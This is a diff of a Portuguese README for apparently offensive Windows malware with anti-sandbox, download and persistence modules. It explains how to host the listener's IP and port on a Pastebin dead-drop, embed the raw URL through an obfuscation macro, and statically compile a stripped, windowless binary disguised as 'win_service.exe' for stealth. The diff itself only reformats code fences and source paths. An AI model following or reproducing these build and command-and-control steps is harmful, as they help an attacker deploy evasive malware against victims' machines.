@@ -51,15 +51,15 @@ O módulo `DownloadManager` foi projetado para buscar o IP alvo e a Porta dinami
 O arquivo de texto remoto deve conter exatamente o endereço IP e a porta, separados por um único *pipe*. Ele não deve conter **nenhum** espaço extra, protocolos (como `tcp://`) ou quebras de linha no final.
 
 **Formato:**
-'''text
+```text
 <IP_ADDRESS>|<PORT>
-'''
+```
 
 **Exemplo de Implantação no Pastebin:**
 1. Crie um novo *paste* contendo apenas o IP e a Porta do seu ouvinte (ex: seu IP do Ngrok ou IP local do Kali):
-'''text
+```text
 3.14.15.92|12345
-'''
+```
 2. Salve o *paste* e copie o link **Raw** (Cru) (ex: `https://pastebin.com/raw/XYZ123`).
 3. Atualize a macro `PROTECT("...")` no `main.cpp` com esta **URL Raw** antes de compilar. 
 
@@ -71,9 +71,9 @@ O arquivo de texto remoto deve conter exatamente o endereço IP e a porta, separ
 
 Para manter o seu perfil furtivo e evitar o uso de dependências externas (como `vcruntime` ou `libstdc++`), compile o binário estaticamente usando o MinGW-w64 (GCC) com o padrão C++20 ativado:
 
-'''bash
-g++ main.cpp AntiSandbox.cpp DownloadManager.cpp PersistenceManager.cpp -o win_service.exe -std=c++20 -static -static-libgcc -static-libstdc++ -mwindows -s -lws2_32 -lwininet -lole32 -loleaut32 -luuid
-'''
+```bash
+g++ src/main.cpp src/AntiSandbox.cpp src/DownloadManager.cpp src/PersistenceManager.cpp -Iinclude -o win_service.exe -std=c++20 -static -static-libgcc -static-libstdc++ -mwindows -s -lws2_32 -lwininet -lole32 -loleaut32 -luuid
+```
 
 **Detalhamento das Flags do Compilador:**
 * `-std=c++20`: Necessário para a ofuscação de *string* XOR em tempo de compilação (`constexpr`).
